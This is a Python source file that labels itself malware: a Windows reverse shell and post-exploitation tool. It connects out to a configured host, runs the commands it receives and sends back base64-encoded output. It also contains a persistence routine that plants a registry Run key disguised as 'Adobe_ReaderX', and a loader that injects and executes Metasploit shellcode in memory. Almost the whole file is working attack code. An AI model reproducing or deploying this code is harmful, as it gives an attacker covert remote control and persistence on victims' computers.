"""
    @Malware
    ST2Labs / GEO SYSTEM SOFTWARE
 
    Python Reverse Shell / Post-Explotation
 
    This code is base on:
        http://www.primalsecurity.net/
        Post: /0xc-python-tutorial-python-malware
"""
import sys
import base64
import os
import socket
 
 
def autorun(tempdir, fileName, run):
    # Copy executable to %TEMP%:
    os.system('copy %s %s' % (fileName, tempdir))
 
    # Queries Windows registry for the autorun key value
    # Stores the key values in runkey array
    key = OpenKey(HKEY_LOCAL_MACHINE, run)
    runkey = []
    try:
        i = 0
        while True:
            subkey = EnumValue(key, i)
            #print subkey[0]
            runkey.append(subkey[0])
            i += 1
    except WindowsError:
        pass
 
    # If the autorun key "Adobe ReaderX" isn't set this will set the key:
    if 'Adobe ReaderX' not in runkey:
        try:
            key = OpenKey(HKEY_LOCAL_MACHINE, run, 0, KEY_ALL_ACCESS)
            SetValueEx(key, 'Adobe_ReaderX', 0, REG_SZ, r"%TEMP%\rsh.exe")
            key.Close()
        except WindowsError:
            pass
 
 
# Decode Base64 data
def decode(data):
    if len(data) % 4 != 0:  # check if multiple of 4
        while len(data) % 4 != 0:
            data = data + "="
        req_str = base64.b64decode(data)
    else:
        req_str = base64.b64decode(data)
    return req_str
 
 
# Encode Base64 data
def encode(data):
    return base64.b64encode(data)
 
 
# Get JSON Configuration from file code with Base64
def getconfig(name):
    import json
    with open(name, 'rb') as f:
        d = json.loads(decode(f.read()))
        return d
 
# Run the command
def command(cmd):
    import subprocess
    import shlex
    args = shlex.split(cmd)

    try:
        p = subprocess.Popen(args, shell=True, stdout=subprocess.PIPE)
        out_, err_ = p.communicate()
        if p.returncode != 0:
            return "Command not valid"
        else:
            return out_
    except:
        return "Command not valid"

#Launch meterpreter shell
def meterpreter():    
    import ctypes
    #ShellCode
    #x86/shikata_ga_nai succeeded with size 227 (iteration=1)
    #Metasploit windows/exec calc.exe
    shellcode=bytearray(
    "\xd9\xe8\xba\x0e\xd4\x73\x25\xd9\x74\x24\xf4\x5f\x31"
    "\xc9\xb1\x33\x31\x57\x17\x03\x57\x17\x83\xc9\xd0\x91"
    "\xd0\x29\x30\xdc\x1b\xd1\xc1\xbf\x92\x34\xf0\xed\xc1"
    "\x3d\xa1\x21\x81\x13\x4a\xc9\xc7\x87\xd9\xbf\xcf\xa8"
    "\x6a\x75\x36\x87\x6b\xbb\xf6\x4b\xaf\xdd\x8a\x91\xfc"
    "\x3d\xb2\x5a\xf1\x3c\xf3\x86\xfa\x6d\xac\xcd\xa9\x81"
    "\xd9\x93\x71\xa3\x0d\x98\xca\xdb\x28\x5e\xbe\x51\x32"
    "\x8e\x6f\xed\x7c\x36\x1b\xa9\x5c\x47\xc8\xa9\xa1\x0e"
    "\x65\x19\x51\x91\xaf\x53\x9a\xa0\x8f\x38\xa5\x0d\x02"
    "\x40\xe1\xa9\xfd\x37\x19\xca\x80\x4f\xda\xb1\x5e\xc5"
    "\xff\x11\x14\x7d\x24\xa0\xf9\x18\xaf\xae\xb6\x6f\xf7"
    "\xb2\x49\xa3\x83\xce\xc2\x42\x44\x47\x90\x60\x40\x0c"
    "\x42\x08\xd1\xe8\x25\x35\x01\x54\x99\x93\x49\x76\xce"
    "\xa2\x13\x1c\x11\x26\x2e\x59\x11\x38\x31\xc9\x7a\x09"
    "\xba\x86\xfd\x96\x69\xe3\xf2\xdc\x30\x45\x9b\xb8\xa0"
    "\xd4\xc6\x3a\x1f\x1a\xff\xb8\xaa\xe2\x04\xa0\xde\xe7"
    "\x41\x66\x32\x95\xda\x03\x34\x0a\xda\x01\x57\xcd\x48"
    "\xc9\xb6\x68\xe9\x68\xc7")
     
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                              ctypes.c_int(len(shellcode)),
                                              ctypes.c_int(0x3000),
                                              ctypes.c_int(0x40))
     
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
     
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                         buf,
                                         ctypes.c_int(len(shellcode)))
     
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.c_int(ptr),
                                             ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.pointer(ctypes.c_int(0)))
     
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
    

def shell(ip, port):
    #Base64 encoded reverse shell
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        msg = '[*] Connection Established!'
        s.send(encode(msg))
        while 1:
            cmd = decode(s.recv(1024))
            if cmd == "quit":
                response = "Se ha cerrado la conexion"
                encoded = encode(response)
                s.send(encoded)
                break
            elif cmd == "meterpreter":
                response = "Se ha creado una cola Meterpreter Reverse TCP al 4444"            
                encoded = encode(response)
                s.send(encoded)
                meterpreter()
            else:
                response = command(cmd)
                # Here is where must implement action stuff
                # response is result to exceute action
                encoded = encode(response)
                s.send(encoded)           
    finally:
        s.close()
 
 
def main():
    try:
        #tempdir = '%TEMP%'
        #fileName = sys.argv[0]
        #run = "Software\Microsoft\Windows\CurrentVersion\Run"
        #autorun(tempdir, fileName, run)
        conf = getconfig('conf.ini')
        shell(conf['ip'], conf['port'])
    except KeyboardInterrupt:
        sys.exit(2)
 
if __name__ == "__main__":
        main()
